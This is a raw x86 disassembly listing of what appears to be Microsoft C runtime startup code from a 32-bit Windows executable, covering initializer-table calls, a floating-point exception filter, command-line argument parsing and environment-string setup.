  4038d1:	ff 74 24 08          	push   0x8(%esp)
  4038d5:	89 3d a8 97 40 00    	mov    %edi,0x4097a8
  4038db:	ff 15 f8 70 40 00    	call   *0x4070f8
  4038e1:	5f                   	pop    %edi
  4038e2:	c3                   	ret
  4038e3:	6a 0d                	push   $0xd
  4038e5:	e8 7b 0c 00 00       	call   0x404565
  4038ea:	59                   	pop    %ecx
  4038eb:	c3                   	ret
  4038ec:	6a 0d                	push   $0xd
  4038ee:	e8 d3 0c 00 00       	call   0x4045c6
  4038f3:	59                   	pop    %ecx
  4038f4:	c3                   	ret
  4038f5:	56                   	push   %esi
  4038f6:	8b 74 24 08          	mov    0x8(%esp),%esi
  4038fa:	3b 74 24 0c          	cmp    0xc(%esp),%esi
  4038fe:	73 0d                	jae    0x40390d
  403900:	8b 06                	mov    (%esi),%eax
  403902:	85 c0                	test   %eax,%eax
  403904:	74 02                	je     0x403908
  403906:	ff d0                	call   *%eax
  403908:	83 c6 04             	add    $0x4,%esi
  40390b:	eb ed                	jmp    0x4038fa
  40390d:	5e                   	pop    %esi
  40390e:	c3                   	ret
  40390f:	55                   	push   %ebp
  403910:	8b ec                	mov    %esp,%ebp
  403912:	51                   	push   %ecx
  403913:	53                   	push   %ebx
  403914:	56                   	push   %esi
  403915:	e8 20 08 00 00       	call   0x40413a
  40391a:	8b f0                	mov    %eax,%esi
  40391c:	ff 76 50             	push   0x50(%esi)
  40391f:	ff 75 08             	push   0x8(%ebp)
  403922:	e8 26 01 00 00       	call   0x403a4d
  403927:	59                   	pop    %ecx
  403928:	85 c0                	test   %eax,%eax
  40392a:	59                   	pop    %ecx
  40392b:	0f 84 0f 01 00 00    	je     0x403a40
  403931:	8b 58 08             	mov    0x8(%eax),%ebx
  403934:	85 db                	test   %ebx,%ebx
  403936:	89 5d 08             	mov    %ebx,0x8(%ebp)
  403939:	0f 84 01 01 00 00    	je     0x403a40
  40393f:	83 fb 05             	cmp    $0x5,%ebx
  403942:	75 0c                	jne    0x403950
  403944:	83 60 08 00          	andl   $0x0,0x8(%eax)
  403948:	6a 01                	push   $0x1
  40394a:	58                   	pop    %eax
  40394b:	e9 f9 00 00 00       	jmp    0x403a49
  403950:	83 fb 01             	cmp    $0x1,%ebx
  403953:	0f 84 e2 00 00 00    	je     0x403a3b
  403959:	8b 4e 54             	mov    0x54(%esi),%ecx
  40395c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40395f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403962:	89 4e 54             	mov    %ecx,0x54(%esi)
  403965:	8b 48 04             	mov    0x4(%eax),%ecx
  403968:	83 f9 08             	cmp    $0x8,%ecx
  40396b:	0f 85 bc 00 00 00    	jne    0x403a2d
  403971:	8b 15 68 87 40 00    	mov    0x408768,%edx
  403977:	8b 0d 6c 87 40 00    	mov    0x40876c,%ecx
  40397d:	03 ca                	add    %edx,%ecx
  40397f:	57                   	push   %edi
  403980:	3b d1                	cmp    %ecx,%edx
  403982:	7d 27                	jge    0x4039ab
  403984:	8d 0c 52             	lea    (%edx,%edx,2),%ecx
  403987:	c1 e1 02             	shl    $0x2,%ecx
  40398a:	8b 7e 50             	mov    0x50(%esi),%edi
  40398d:	83 c1 0c             	add    $0xc,%ecx
  403990:	83 64 39 fc 00       	andl   $0x0,-0x4(%ecx,%edi,1)
  403995:	8b 3d 68 87 40 00    	mov    0x408768,%edi
  40399b:	8b 1d 6c 87 40 00    	mov    0x40876c,%ebx
  4039a1:	42                   	inc    %edx
  4039a2:	03 df                	add    %edi,%ebx
  4039a4:	3b d3                	cmp    %ebx,%edx
  4039a6:	7c e2                	jl     0x40398a
  4039a8:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4039ab:	8b 00                	mov    (%eax),%eax
  4039ad:	8b 7e 58             	mov    0x58(%esi),%edi
  4039b0:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  4039b5:	75 09                	jne    0x4039c0
  4039b7:	c7 46 58 83 00 00 00 	movl   $0x83,0x58(%esi)
  4039be:	eb 5e                	jmp    0x403a1e
  4039c0:	3d 90 00 00 c0       	cmp    $0xc0000090,%eax
  4039c5:	75 09                	jne    0x4039d0
  4039c7:	c7 46 58 81 00 00 00 	movl   $0x81,0x58(%esi)
  4039ce:	eb 4e                	jmp    0x403a1e
  4039d0:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  4039d5:	75 09                	jne    0x4039e0
  4039d7:	c7 46 58 84 00 00 00 	movl   $0x84,0x58(%esi)
  4039de:	eb 3e                	jmp    0x403a1e
  4039e0:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  4039e5:	75 09                	jne    0x4039f0
  4039e7:	c7 46 58 85 00 00 00 	movl   $0x85,0x58(%esi)
  4039ee:	eb 2e                	jmp    0x403a1e
  4039f0:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  4039f5:	75 09                	jne    0x403a00
  4039f7:	c7 46 58 82 00 00 00 	movl   $0x82,0x58(%esi)
  4039fe:	eb 1e                	jmp    0x403a1e
  403a00:	3d 8f 00 00 c0       	cmp    $0xc000008f,%eax
  403a05:	75 09                	jne    0x403a10
  403a07:	c7 46 58 86 00 00 00 	movl   $0x86,0x58(%esi)
  403a0e:	eb 0e                	jmp    0x403a1e
  403a10:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  403a15:	75 07                	jne    0x403a1e
  403a17:	c7 46 58 8a 00 00 00 	movl   $0x8a,0x58(%esi)
  403a1e:	ff 76 58             	push   0x58(%esi)
  403a21:	6a 08                	push   $0x8
  403a23:	ff d3                	call   *%ebx
  403a25:	59                   	pop    %ecx
  403a26:	89 7e 58             	mov    %edi,0x58(%esi)
  403a29:	59                   	pop    %ecx
  403a2a:	5f                   	pop    %edi
  403a2b:	eb 08                	jmp    0x403a35
  403a2d:	83 60 08 00          	andl   $0x0,0x8(%eax)
  403a31:	51                   	push   %ecx
  403a32:	ff d3                	call   *%ebx
  403a34:	59                   	pop    %ecx
  403a35:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403a38:	89 46 54             	mov    %eax,0x54(%esi)
  403a3b:	83 c8 ff             	or     $0xffffffff,%eax
  403a3e:	eb 09                	jmp    0x403a49
  403a40:	ff 75 0c             	push   0xc(%ebp)
  403a43:	ff 15 04 71 40 00    	call   *0x407104
  403a49:	5e                   	pop    %esi
  403a4a:	5b                   	pop    %ebx
  403a4b:	c9                   	leave
  403a4c:	c3                   	ret
  403a4d:	8b 54 24 08          	mov    0x8(%esp),%edx
  403a51:	8b 0d 74 87 40 00    	mov    0x408774,%ecx
  403a57:	56                   	push   %esi
  403a58:	8b 74 24 08          	mov    0x8(%esp),%esi
  403a5c:	39 32                	cmp    %esi,(%edx)
  403a5e:	57                   	push   %edi
  403a5f:	8b c2                	mov    %edx,%eax
  403a61:	74 11                	je     0x403a74
  403a63:	8d 3c 49             	lea    (%ecx,%ecx,2),%edi
  403a66:	8d 3c ba             	lea    (%edx,%edi,4),%edi
  403a69:	83 c0 0c             	add    $0xc,%eax
  403a6c:	3b c7                	cmp    %edi,%eax
  403a6e:	73 04                	jae    0x403a74
  403a70:	39 30                	cmp    %esi,(%eax)
  403a72:	75 f5                	jne    0x403a69
  403a74:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  403a77:	8d 0c 8a             	lea    (%edx,%ecx,4),%ecx
  403a7a:	3b c1                	cmp    %ecx,%eax
  403a7c:	73 04                	jae    0x403a82
  403a7e:	39 30                	cmp    %esi,(%eax)
  403a80:	74 02                	je     0x403a84
  403a82:	33 c0                	xor    %eax,%eax
  403a84:	5f                   	pop    %edi
  403a85:	5e                   	pop    %esi
  403a86:	c3                   	ret
  403a87:	83 3d c8 9c 40 00 00 	cmpl   $0x0,0x409cc8
  403a8e:	75 05                	jne    0x403a95
  403a90:	e8 60 0f 00 00       	call   0x4049f5
  403a95:	56                   	push   %esi
  403a96:	8b 35 d8 9c 40 00    	mov    0x409cd8,%esi
  403a9c:	8a 06                	mov    (%esi),%al
  403a9e:	3c 22                	cmp    $0x22,%al
  403aa0:	75 25                	jne    0x403ac7
  403aa2:	8a 46 01             	mov    0x1(%esi),%al
  403aa5:	46                   	inc    %esi
  403aa6:	3c 22                	cmp    $0x22,%al
  403aa8:	74 15                	je     0x403abf
  403aaa:	84 c0                	test   %al,%al
  403aac:	74 11                	je     0x403abf
  403aae:	0f b6 c0             	movzbl %al,%eax
  403ab1:	50                   	push   %eax
  403ab2:	e8 24 0b 00 00       	call   0x4045db
  403ab7:	85 c0                	test   %eax,%eax
  403ab9:	59                   	pop    %ecx
  403aba:	74 e6                	je     0x403aa2
  403abc:	46                   	inc    %esi
  403abd:	eb e3                	jmp    0x403aa2
  403abf:	80 3e 22             	cmpb   $0x22,(%esi)
  403ac2:	75 0d                	jne    0x403ad1
  403ac4:	46                   	inc    %esi
  403ac5:	eb 0a                	jmp    0x403ad1
  403ac7:	3c 20                	cmp    $0x20,%al
  403ac9:	76 06                	jbe    0x403ad1
  403acb:	46                   	inc    %esi
  403acc:	80 3e 20             	cmpb   $0x20,(%esi)
  403acf:	77 fa                	ja     0x403acb
  403ad1:	8a 06                	mov    (%esi),%al
  403ad3:	84 c0                	test   %al,%al
  403ad5:	74 04                	je     0x403adb
  403ad7:	3c 20                	cmp    $0x20,%al
  403ad9:	76 e9                	jbe    0x403ac4
  403adb:	8b c6                	mov    %esi,%eax
  403add:	5e                   	pop    %esi
  403ade:	c3                   	ret
  403adf:	53                   	push   %ebx
  403ae0:	33 db                	xor    %ebx,%ebx
  403ae2:	39 1d c8 9c 40 00    	cmp    %ebx,0x409cc8
  403ae8:	56                   	push   %esi
  403ae9:	57                   	push   %edi
  403aea:	75 05                	jne    0x403af1
  403aec:	e8 04 0f 00 00       	call   0x4049f5
  403af1:	8b 35 5c 97 40 00    	mov    0x40975c,%esi
  403af7:	33 ff                	xor    %edi,%edi
  403af9:	8a 06                	mov    (%esi),%al
  403afb:	3a c3                	cmp    %bl,%al
  403afd:	74 12                	je     0x403b11
  403aff:	3c 3d                	cmp    $0x3d,%al
  403b01:	74 01                	je     0x403b04
  403b03:	47                   	inc    %edi
  403b04:	56                   	push   %esi
  403b05:	e8 d6 10 00 00       	call   0x404be0
  403b0a:	59                   	pop    %ecx
  403b0b:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403b0f:	eb e8                	jmp    0x403af9
  403b11:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  403b18:	50                   	push   %eax
  403b19:	e8 32 10 00 00       	call   0x404b50
  403b1e:	8b f0                	mov    %eax,%esi
  403b20:	59                   	pop    %ecx
  403b21:	3b f3                	cmp    %ebx,%esi
  403b23:	89 35 88 97 40 00    	mov    %esi,0x409788
  403b29:	75 08                	jne    0x403b33
  403b2b:	6a 09                	push   $0x9
  403b2d:	e8 74 fc ff ff       	call   0x4037a6
  403b32:	59                   	pop    %ecx
  403b33:	8b 3d 5c 97 40 00    	mov    0x40975c,%edi
  403b39:	38 1f                	cmp    %bl,(%edi)
  403b3b:	74 39                	je     0x403b76
  403b3d:	55                   	push   %ebp
  403b3e:	57                   	push   %edi
  403b3f:	e8 9c 10 00 00       	call   0x404be0
  403b44:	8b e8                	mov    %eax,%ebp
  403b46:	59                   	pop    %ecx
  403b47:	45                   	inc    %ebp
  403b48:	80 3f 3d             	cmpb   $0x3d,(%edi)
  403b4b:	74 22                	je     0x403b6f
  403b4d:	55                   	push   %ebp
  403b4e:	e8 fd 0f 00 00       	call   0x404b50
  403b53:	3b c3                	cmp    %ebx,%eax
  403b55:	59                   	pop    %ecx
  403b56:	89 06                	mov    %eax,(%esi)
  403b58:	75 08                	jne    0x403b62
  403b5a:	6a 09                	push   $0x9
  403b5c:	e8 45 fc ff ff       	call   0x4037a6
  403b61:	59                   	pop    %ecx
  403b62:	57                   	push   %edi
  403b63:	ff 36                	push   (%esi)
  403b65:	e8 f6 0e 00 00       	call   0x404a60
  403b6a:	59                   	pop    %ecx
  403b6b:	83 c6 04             	add    $0x4,%esi
  403b6e:	59                   	pop    %ecx
  403b6f:	03 fd                	add    %ebp,%edi
  403b71:	38 1f                	cmp    %bl,(%edi)
  403b73:	75 c9                	jne    0x403b3e
  403b75:	5d                   	pop    %ebp
  403b76:	ff 35 5c 97 40 00    	push   0x40975c
  403b7c:	e8 90 0e 00 00       	call   0x404a11
  403b81:	59                   	pop    %ecx
  403b82:	89 1d 5c 97 40 00    	mov    %ebx,0x40975c
  403b88:	89 1e                	mov    %ebx,(%esi)
  403b8a:	5f                   	pop    %edi
  403b8b:	5e                   	pop    %esi
  403b8c:	c7 05 c4 9c 40 00 01 	movl   $0x1,0x409cc4
  403b93:	00 00 00 
  403b96:	5b                   	pop    %ebx
  403b97:	c3                   	ret
  403b98:	55                   	push   %ebp
  403b99:	8b ec                	mov    %esp,%ebp
  403b9b:	51                   	push   %ecx
  403b9c:	51                   	push   %ecx
  403b9d:	53                   	push   %ebx
  403b9e:	33 db                	xor    %ebx,%ebx
  403ba0:	39 1d c8 9c 40 00    	cmp    %ebx,0x409cc8
  403ba6:	56                   	push   %esi
  403ba7:	57                   	push   %edi
  403ba8:	75 05                	jne    0x403baf
  403baa:	e8 46 0e 00 00       	call   0x4049f5
  403baf:	be ac 97 40 00       	mov    $0x4097ac,%esi
  403bb4:	68 04 01 00 00       	push   $0x104
  403bb9:	56                   	push   %esi
  403bba:	53                   	push   %ebx
  403bbb:	ff 15 60 70 40 00    	call   *0x407060
  403bc1:	a1 d8 9c 40 00       	mov    0x409cd8,%eax
  403bc6:	89 35 98 97 40 00    	mov    %esi,0x409798
  403bcc:	8b fe                	mov    %esi,%edi
  403bce:	38 18                	cmp    %bl,(%eax)
  403bd0:	74 02                	je     0x403bd4
  403bd2:	8b f8                	mov    %eax,%edi
  403bd4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403bd7:	50                   	push   %eax
  403bd8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403bdb:	50                   	push   %eax
  403bdc:	53                   	push   %ebx
  403bdd:	53                   	push   %ebx
  403bde:	57                   	push   %edi
  403bdf:	e8 4d 00 00 00       	call   0x403c31
  403be4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403be7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403bea:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403bed:	50                   	push   %eax
  403bee:	e8 5d 0f 00 00       	call   0x404b50
  403bf3:	8b f0                	mov    %eax,%esi
  403bf5:	83 c4 18             	add    $0x18,%esp
  403bf8:	3b f3                	cmp    %ebx,%esi
  403bfa:	75 08                	jne    0x403c04
  403bfc:	6a 08                	push   $0x8
  403bfe:	e8 a3 fb ff ff       	call   0x4037a6
  403c03:	59                   	pop    %ecx
  403c04:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403c07:	50                   	push   %eax
  403c08:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403c0b:	50                   	push   %eax
  403c0c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403c0f:	8d 04 86             	lea    (%esi,%eax,4),%eax
  403c12:	50                   	push   %eax
  403c13:	56                   	push   %esi
  403c14:	57                   	push   %edi
  403c15:	e8 17 00 00 00       	call   0x403c31
  403c1a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403c1d:	83 c4 14             	add    $0x14,%esp
  403c20:	48                   	dec    %eax
  403c21:	89 35 80 97 40 00    	mov    %esi,0x409780
  403c27:	5f                   	pop    %edi
  403c28:	5e                   	pop    %esi
  403c29:	a3 7c 97 40 00       	mov    %eax,0x40977c
  403c2e:	5b                   	pop    %ebx
  403c2f:	c9                   	leave
  403c30:	c3                   	ret
  403c31:	55                   	push   %ebp
  403c32:	8b ec                	mov    %esp,%ebp
  403c34:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403c37:	8b 45 14             	mov    0x14(%ebp),%eax
  403c3a:	53                   	push   %ebx
  403c3b:	56                   	push   %esi
  403c3c:	83 21 00             	andl   $0x0,(%ecx)
  403c3f:	8b 75 10             	mov    0x10(%ebp),%esi
  403c42:	57                   	push   %edi
  403c43:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403c46:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403c4c:	8b 45 08             	mov    0x8(%ebp),%eax
  403c4f:	85 ff                	test   %edi,%edi
  403c51:	74 08                	je     0x403c5b
  403c53:	89 37                	mov    %esi,(%edi)
  403c55:	83 c7 04             	add    $0x4,%edi
  403c58:	89 7d 0c             	mov    %edi,0xc(%ebp)
  403c5b:	80 38 22             	cmpb   $0x22,(%eax)
  403c5e:	75 44                	jne    0x403ca4
  403c60:	8a 50 01             	mov    0x1(%eax),%dl
  403c63:	40                   	inc    %eax
  403c64:	80 fa 22             	cmp    $0x22,%dl
  403c67:	74 29                	je     0x403c92
  403c69:	84 d2                	test   %dl,%dl
  403c6b:	74 25                	je     0x403c92
  403c6d:	0f b6 d2             	movzbl %dl,%edx
  403c70:	f6 82 a1 9a 40 00 04 	testb  $0x4,0x409aa1(%edx)
  403c77:	74 0c                	je     0x403c85
  403c79:	ff 01                	incl   (%ecx)
  403c7b:	85 f6                	test   %esi,%esi
  403c7d:	74 06                	je     0x403c85
  403c7f:	8a 10                	mov    (%eax),%dl
  403c81:	88 16                	mov    %dl,(%esi)
  403c83:	46                   	inc    %esi
  403c84:	40                   	inc    %eax
  403c85:	ff 01                	incl   (%ecx)
  403c87:	85 f6                	test   %esi,%esi
  403c89:	74 d5                	je     0x403c60
  403c8b:	8a 10                	mov    (%eax),%dl
  403c8d:	88 16                	mov    %dl,(%esi)
  403c8f:	46                   	inc    %esi
  403c90:	eb ce                	jmp    0x403c60
  403c92:	ff 01                	incl   (%ecx)
  403c94:	85 f6                	test   %esi,%esi
  403c96:	74 04                	je     0x403c9c
  403c98:	80 26 00             	andb   $0x0,(%esi)
  403c9b:	46                   	inc    %esi
  403c9c:	80 38 22             	cmpb   $0x22,(%eax)
  403c9f:	75 46                	jne    0x403ce7
  403ca1:	40                   	inc    %eax
  403ca2:	eb 43                	jmp    0x403ce7
  403ca4:	ff 01                	incl   (%ecx)
  403ca6:	85 f6                	test   %esi,%esi
  403ca8:	74 05                	je     0x403caf
  403caa:	8a 10                	mov    (%eax),%dl
  403cac:	88 16                	mov    %dl,(%esi)
  403cae:	46                   	inc    %esi
  403caf:	8a 10                	mov    (%eax),%dl
  403cb1:	40                   	inc    %eax
  403cb2:	0f b6 da             	movzbl %dl,%ebx
  403cb5:	f6 83 a1 9a 40 00 04 	testb  $0x4,0x409aa1(%ebx)
  403cbc:	74 0c                	je     0x403cca
  403cbe:	ff 01                	incl   (%ecx)
  403cc0:	85 f6                	test   %esi,%esi
  403cc2:	74 05                	je     0x403cc9
  403cc4:	8a 18                	mov    (%eax),%bl
  403cc6:	88 1e                	mov    %bl,(%esi)
  403cc8:	46                   	inc    %esi
  403cc9:	40                   	inc    %eax
  403cca:	80 fa 20             	cmp    $0x20,%dl
  403ccd:	74 09                	je     0x403cd8
  403ccf:	84 d2                	test   %dl,%dl
  403cd1:	74 09                	je     0x403cdc
  403cd3:	80 fa 09             	cmp    $0x9,%dl
  403cd6:	75 cc                	jne    0x403ca4
  403cd8:	84 d2                	test   %dl,%dl
  403cda:	75 03                	jne    0x403cdf
  403cdc:	48                   	dec    %eax
  403cdd:	eb 08                	jmp    0x403ce7
  403cdf:	85 f6                	test   %esi,%esi
  403ce1:	74 04                	je     0x403ce7
  403ce3:	80 66 ff 00          	andb   $0x0,-0x1(%esi)
  403ce7:	83 65 18 00          	andl   $0x0,0x18(%ebp)
  403ceb:	80 38 00             	cmpb   $0x0,(%eax)
  403cee:	0f 84 e0 00 00 00    	je     0x403dd4
  403cf4:	8a 10                	mov    (%eax),%dl
  403cf6:	80 fa 20             	cmp    $0x20,%dl
  403cf9:	74 05                	je     0x403d00
  403cfb:	80 fa 09             	cmp    $0x9,%dl
  403cfe:	75 03                	jne    0x403d03
  403d00:	40                   	inc    %eax
  403d01:	eb f1                	jmp    0x403cf4
  403d03:	80 38 00             	cmpb   $0x0,(%eax)
  403d06:	0f 84 c8 00 00 00    	je     0x403dd4
  403d0c:	85 ff                	test   %edi,%edi
  403d0e:	74 08                	je     0x403d18
  403d10:	89 37                	mov    %esi,(%edi)
  403d12:	83 c7 04             	add    $0x4,%edi
  403d15:	89 7d 0c             	mov    %edi,0xc(%ebp)
  403d18:	8b 55 14             	mov    0x14(%ebp),%edx
  403d1b:	ff 02                	incl   (%edx)
  403d1d:	c7 45 08 01 00 00 00 	movl   $0x1,0x8(%ebp)
  403d24:	33 db                	xor    %ebx,%ebx
  403d26:	80 38 5c             	cmpb   $0x5c,(%eax)
  403d29:	75 04                	jne    0x403d2f
  403d2b:	40                   	inc    %eax
  403d2c:	43                   	inc    %ebx
  403d2d:	eb f7                	jmp    0x403d26
  403d2f:	80 38 22             	cmpb   $0x22,(%eax)
  403d32:	75 2c                	jne    0x403d60
  403d34:	f6 c3 01             	test   $0x1,%bl
  403d37:	75 25                	jne    0x403d5e
  403d39:	33 ff                	xor    %edi,%edi
  403d3b:	39 7d 18             	cmp    %edi,0x18(%ebp)
  403d3e:	74 0d                	je     0x403d4d
  403d40:	80 78 01 22          	cmpb   $0x22,0x1(%eax)
  403d44:	8d 50 01             	lea    0x1(%eax),%edx
  403d47:	75 04                	jne    0x403d4d
  403d49:	8b c2                	mov    %edx,%eax
  403d4b:	eb 03                	jmp    0x403d50
  403d4d:	89 7d 08             	mov    %edi,0x8(%ebp)
  403d50:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403d53:	33 d2                	xor    %edx,%edx
  403d55:	39 55 18             	cmp    %edx,0x18(%ebp)
  403d58:	0f 94 c2             	sete   %dl
  403d5b:	89 55 18             	mov    %edx,0x18(%ebp)
  403d5e:	d1 eb                	shr    $1,%ebx
  403d60:	8b d3                	mov    %ebx,%edx
  403d62:	4b                   	dec    %ebx
  403d63:	85 d2                	test   %edx,%edx
  403d65:	74 0e                	je     0x403d75
  403d67:	43                   	inc    %ebx
  403d68:	85 f6                	test   %esi,%esi
  403d6a:	74 04                	je     0x403d70
  403d6c:	c6 06 5c             	movb   $0x5c,(%esi)
  403d6f:	46                   	inc    %esi
  403d70:	ff 01                	incl   (%ecx)
  403d72:	4b                   	dec    %ebx
  403d73:	75 f3                	jne    0x403d68
  403d75:	8a 10                	mov    (%eax),%dl
  403d77:	84 d2                	test   %dl,%dl
  403d79:	74 4a                	je     0x403dc5
  403d7b:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  403d7f:	75 0a                	jne    0x403d8b
  403d81:	80 fa 20             	cmp    $0x20,%dl
  403d84:	74 3f                	je     0x403dc5
  403d86:	80 fa 09             	cmp    $0x9,%dl
  403d89:	74 3a                	je     0x403dc5
  403d8b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403d8f:	74 2e                	je     0x403dbf
  403d91:	85 f6                	test   %esi,%esi
  403d93:	74 19                	je     0x403dae
  403d95:	0f b6 da             	movzbl %dl,%ebx
  403d98:	f6 83 a1 9a 40 00 04 	testb  $0x4,0x409aa1(%ebx)
  403d9f:	74 06                	je     0x403da7
  403da1:	88 16                	mov    %dl,(%esi)
  403da3:	46                   	inc    %esi
  403da4:	40                   	inc    %eax
  403da5:	ff 01                	incl   (%ecx)
  403da7:	8a 10                	mov    (%eax),%dl
  403da9:	88 16                	mov    %dl,(%esi)
  403dab:	46                   	inc    %esi
  403dac:	eb 0f                	jmp    0x403dbd
  403dae:	0f b6 d2             	movzbl %dl,%edx
  403db1:	f6 82 a1 9a 40 00 04 	testb  $0x4,0x409aa1(%edx)
  403db8:	74 03                	je     0x403dbd
  403dba:	40                   	inc    %eax
  403dbb:	ff 01                	incl   (%ecx)
  403dbd:	ff 01                	incl   (%ecx)
  403dbf:	40                   	inc    %eax
  403dc0:	e9 58 ff ff ff       	jmp    0x403d1d
  403dc5:	85 f6                	test   %esi,%esi
  403dc7:	74 04                	je     0x403dcd
  403dc9:	80 26 00             	andb   $0x0,(%esi)
  403dcc:	46                   	inc    %esi
  403dcd:	ff 01                	incl   (%ecx)
  403dcf:	e9 17 ff ff ff       	jmp    0x403ceb
  403dd4:	85 ff                	test   %edi,%edi
  403dd6:	74 03                	je     0x403ddb
  403dd8:	83 27 00             	andl   $0x0,(%edi)
  403ddb:	8b 45 14             	mov    0x14(%ebp),%eax
  403dde:	5f                   	pop    %edi
  403ddf:	5e                   	pop    %esi
  403de0:	5b                   	pop    %ebx
  403de1:	ff 00                	incl   (%eax)
  403de3:	5d                   	pop    %ebp
  403de4:	c3                   	ret
  403de5:	51                   	push   %ecx
  403de6:	51                   	push   %ecx
  403de7:	a1 b0 98 40 00       	mov    0x4098b0,%eax
  403dec:	53                   	push   %ebx
  403ded:	55                   	push   %ebp
  403dee:	8b 2d 14 71 40 00    	mov    0x407114,%ebp
  403df4:	56                   	push   %esi
  403df5:	57                   	push   %edi
  403df6:	33 db                	xor    %ebx,%ebx
  403df8:	33 f6                	xor    %esi,%esi
  403dfa:	33 ff                	xor    %edi,%edi
  403dfc:	3b c3                	cmp    %ebx,%eax
  403dfe:	75 33                	jne    0x403e33
  403e00:	ff d5                	call   *%ebp
  403e02:	8b f0                	mov    %eax,%esi
  403e04:	3b f3                	cmp    %ebx,%esi
  403e06:	74 0c                	je     0x403e14
  403e08:	c7 05 b0 98 40 00 01 	movl   $0x1,0x4098b0
  403e0f:	00 00 00 
  403e12:	eb 28                	jmp    0x403e3c
  403e14:	ff 15 10 71 40 00    	call   *0x407110
  403e1a:	8b f8                	mov    %eax,%edi
  403e1c:	3b fb                	cmp    %ebx,%edi
  403e1e:	0f 84 ea 00 00 00    	je     0x403f0e
  403e24:	c7 05 b0 98 40 00 02 	movl   $0x2,0x4098b0
  403e2b:	00 00 00 
  403e2e:	e9 8f 00 00 00       	jmp    0x403ec2
  403e33:	83 f8 01             	cmp    $0x1,%eax
  403e36:	0f 85 81 00 00 00    	jne    0x403ebd
  403e3c:	3b f3                	cmp    %ebx,%esi
  403e3e:	75 0c                	jne    0x403e4c
  403e40:	ff d5                	call   *%ebp
  403e42:	8b f0                	mov    %eax,%esi
  403e44:	3b f3                	cmp    %ebx,%esi
  403e46:	0f 84 c2 00 00 00    	je     0x403f0e
  403e4c:	66 39 1e             	cmp    %bx,(%esi)
  403e4f:	8b c6                	mov    %esi,%eax
  403e51:	74 0e                	je     0x403e61
  403e53:	40                   	inc    %eax
  403e54:	40                   	inc    %eax
  403e55:	66 39 18             	cmp    %bx,(%eax)
  403e58:	75 f9                	jne    0x403e53
  403e5a:	40                   	inc    %eax
  403e5b:	40                   	inc    %eax
  403e5c:	66 39 18             	cmp    %bx,(%eax)
  403e5f:	75 f2                	jne    0x403e53
  403e61:	2b c6                	sub    %esi,%eax
  403e63:	8b 3d 48 70 40 00    	mov    0x407048,%edi
  403e69:	d1 f8                	sar    $1,%eax
  403e6b:	53                   	push   %ebx
  403e6c:	53                   	push   %ebx
  403e6d:	40                   	inc    %eax
  403e6e:	53                   	push   %ebx
  403e6f:	53                   	push   %ebx
  403e70:	50                   	push   %eax
  403e71:	56                   	push   %esi
  403e72:	53                   	push   %ebx
  403e73:	53                   	push   %ebx
  403e74:	89 44 24 34          	mov    %eax,0x34(%esp)
  403e78:	ff d7                	call   *%edi
  403e7a:	8b e8                	mov    %eax,%ebp
  403e7c:	3b eb                	cmp    %ebx,%ebp
  403e7e:	74 32                	je     0x403eb2
  403e80:	55                   	push   %ebp
  403e81:	e8 ca 0c 00 00       	call   0x404b50
  403e86:	3b c3                	cmp    %ebx,%eax
  403e88:	59                   	pop    %ecx
  403e89:	89 44 24 10          	mov    %eax,0x10(%esp)
  403e8d:	74 23                	je     0x403eb2
  403e8f:	53                   	push   %ebx
  403e90:	53                   	push   %ebx
  403e91:	55                   	push   %ebp
  403e92:	50                   	push   %eax
  403e93:	ff 74 24 24          	push   0x24(%esp)
  403e97:	56                   	push   %esi
  403e98:	53                   	push   %ebx
  403e99:	53                   	push   %ebx
  403e9a:	ff d7                	call   *%edi
  403e9c:	85 c0                	test   %eax,%eax
  403e9e:	75 0e                	jne    0x403eae
  403ea0:	ff 74 24 10          	push   0x10(%esp)
  403ea4:	e8 68 0b 00 00       	call   0x404a11
  403ea9:	59                   	pop    %ecx
  403eaa:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403eae:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403eb2:	56                   	push   %esi
  403eb3:	ff 15 0c 71 40 00    	call   *0x40710c
  403eb9:	8b c3                	mov    %ebx,%eax
  403ebb:	eb 53                	jmp    0x403f10
  403ebd:	83 f8 02             	cmp    $0x2,%eax
  403ec0:	75 4c                	jne    0x403f0e
  403ec2:	3b fb                	cmp    %ebx,%edi
  403ec4:	75 0c                	jne    0x403ed2
  403ec6:	ff 15 10 71 40 00    	call   *0x407110
  403ecc:	8b f8                	mov    %eax,%edi
  403ece:	3b fb                	cmp    %ebx,%edi
  403ed0:	74 3c                	je     0x403f0e
  403ed2:	38 1f                	cmp    %bl,(%edi)
  403ed4:	8b c7                	mov    %edi,%eax
  403ed6:	74 0a                	je     0x403ee2
  403ed8:	40                   	inc    %eax
  403ed9:	38 18                	cmp    %bl,(%eax)
  403edb:	75 fb                	jne    0x403ed8
  403edd:	40                   	inc    %eax
  403ede:	38 18                	cmp    %bl,(%eax)
  403ee0:	75 f6                	jne    0x403ed8
  403ee2:	2b c7                	sub    %edi,%eax
  403ee4:	40                   	inc    %eax
  403ee5:	8b e8                	mov    %eax,%ebp
  403ee7:	55                   	push   %ebp
  403ee8:	e8 63 0c 00 00       	call   0x404b50
